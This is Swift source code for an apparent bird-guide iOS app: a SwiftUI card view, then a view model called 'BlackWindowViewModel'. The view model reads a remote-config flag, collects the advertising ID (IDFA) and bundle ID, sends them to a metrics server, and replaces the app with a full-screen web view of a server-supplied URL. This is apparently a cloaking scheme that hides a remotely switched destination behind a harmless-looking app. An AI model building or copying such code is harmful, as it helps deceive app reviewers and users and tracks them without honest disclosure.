import SwiftUI

struct RareBirdCard: View {
    /// Модель птицы для отображения
    let bird: RareBird
    /// Необязательное действие по нажатию (обрабатывается снаружи по желанию)
    var onTap: (() -> Void)? = nil
    
    var body: some View {
        HStack(alignment: .center, spacing: 8) {
            // Фото птицы в круге
            Image(bird.imageFileName)
                .resizable()
                .scaledToFill()
                .frame(width: 80, height: 80)
                .clipShape(Circle())
                .overlay(
                    Circle().stroke(Color.black.opacity(0.05), lineWidth: 1)
                )
                .background(
                    Circle().fill(Color.white)
                )
            
            VStack(alignment: .leading, spacing: 0) {
                // Название птицы
                Text(bird.commonName)
                    .font(.customFont(font: .regular, size: 20))
                    .foregroundColor(.customBlack)
                    .lineLimit(1)
                
                // Тег(и): пока отображаем ареал как чип
                Text(bird.conservationStatus)
                    .font(.customFont(font: .regular, size: 13))
                    .foregroundColor(.black)
                    .lineLimit(1)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(
                        Capsule()
                            .stroke(Color.black, lineWidth: 1)
                    )
            }
            .padding(.trailing, 4)
            
            Spacer(minLength: 0)
        }
        .padding(8)
        .background(Color.white)
        .clipShape(Capsule())
        .shadow(color: .black.opacity(0.1), radius: 8, x: 0, y: 4)
        .contentShape(Rectangle())
        .onTapGesture { onTap?() }
    }
}

// MARK: - Preview

#Preview("LightEN") {
    RareBirdCard(bird: RareBird.seed.first!)
        .padding()
        .background(.black)
}

import SwiftUI
import SwiftUI
import CryptoKit
import WebKit
import AppTrackingTransparency
import UIKit
import FirebaseCore
import FirebaseRemoteConfig
import OneSignalFramework
import AdSupport


class BlackWindowViewModel: ObservableObject {
    @Published var trackingURL: URL?
    @Published var shouldShowWebView = false
    @Published var isRemoteConfigFetched = false
    @Published var isEnabled = false
    @Published var isTrackingPermissionResolved = false
    @Published var isNotificationPermissionResolved = false
    @Published var isWebViewLoadingComplete = false
    
    private var hasFetchedMetrics = false
    private var hasPostedInitialCheck = false
    
    init() {
        setupObservers()
        initialize()
    }
    
    private func setupObservers() {
        NotificationCenter.default.addObserver(
            forName: .didFetchTrackingURL,
            object: nil,
            queue: .main
        ) { [weak self] notification in
            if let url = notification.userInfo?["trackingURL"] as? URL {
                self?.trackingURL = url
                self?.shouldShowWebView = true
                self?.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(url)
            }
        }
        
        NotificationCenter.default.addObserver(
            forName: .checkTrackingPermission,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.handlePermissionCheck()
        }
        
        NotificationCenter.default.addObserver(
            forName: .notificationPermissionResolved,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            if !(self?.isTrackingPermissionResolved ?? false) {
                NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
            }
        }
    }
    
    private func initialize() {
        if !hasPostedInitialCheck {
            hasPostedInitialCheck = true
            NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
        }
        
        ConfigManager.shared.fetchConfig { [weak self] isEnabled in
            DispatchQueue.main.async {
                self?.isEnabled = isEnabled
                self?.isRemoteConfigFetched = true
                self?.handleConfigFetched()
            }
        }
    }
    
    private func handlePermissionCheck() {
        if !isNotificationPermissionResolved {
            PermissionManager.shared.requestNotificationPermission { [weak self] accepted in
                self?.isNotificationPermissionResolved = true
                NotificationCenter.default.post(
                    name: .notificationPermissionResolved,
                    object: nil,
                    userInfo: ["accepted": accepted]
                )
            }
        } else if !isTrackingPermissionResolved {
            PermissionManager.shared.requestTrackingAuthorization { [weak self] idfa in
                self?.isTrackingPermissionResolved = true
                self?.handlePermissionsResolved(idfa: idfa)
            }
        }
    }
    
    private func handleConfigFetched() {
        if isEnabled {
            if let savedURL = ConfigManager.shared.getSavedURL() {
                if isTrackingPermissionResolved && isNotificationPermissionResolved {
                    trackingURL = savedURL
                    shouldShowWebView = true
                    isWebViewLoadingComplete = true
                    ConfigManager.shared.saveURL(savedURL)
                } else {
                    waitForPermissions(savedURL: savedURL)
                }
            } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
                fetchMetrics()
            }
        } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func handlePermissionsResolved(idfa: String?) {
        if isEnabled && ConfigManager.shared.getSavedURL() == nil {
            fetchMetrics(idfa: idfa)
        }
        if isRemoteConfigFetched && !isEnabled && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func fetchMetrics(idfa: String? = nil) {
        guard !hasFetchedMetrics else { return }
        hasFetchedMetrics = true
        
        let bundleID = Bundle.main.bundleIdentifier ?? "none"
        NetworkManager.shared.fetchMetrics(bundleID: bundleID, salt: AppConstants.salt, idfa: idfa) { [weak self] result in
            DispatchQueue.main.async {
                switch result {
                case .success(let response):
                    if let url = TrackingURLBuilder.buildTrackingURL(from: response, idfa: idfa, bundleID: bundleID) {
                        NotificationCenter.default.post(name: .didFetchTrackingURL, object: nil, userInfo: ["trackingURL": url])
                    } else {
                        self?.isWebViewLoadingComplete = true
                        self?.triggerSplashTransitionIfNeeded()
                    }
                case .failure:
                    self?.isWebViewLoadingComplete = true
                    self?.triggerSplashTransitionIfNeeded()
                }
            }
        }
    }
    
    private func waitForPermissions(savedURL: URL) {
        func checkPermissions() {
            if isTrackingPermissionResolved && isNotificationPermissionResolved {
                self.trackingURL = savedURL
                self.shouldShowWebView = true
                self.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(savedURL)
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    checkPermissions()
                }
            }
        }
        
        DispatchQueue.main.async {
            checkPermissions()
        }
    }
    
    private func triggerSplashTransitionIfNeeded() {
        if isEnabled && trackingURL == nil && isTrackingPermissionResolved && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func triggerSplashTransition() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            NotificationCenter.default.post(name: .splashTransition, object: nil)
        }
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
}
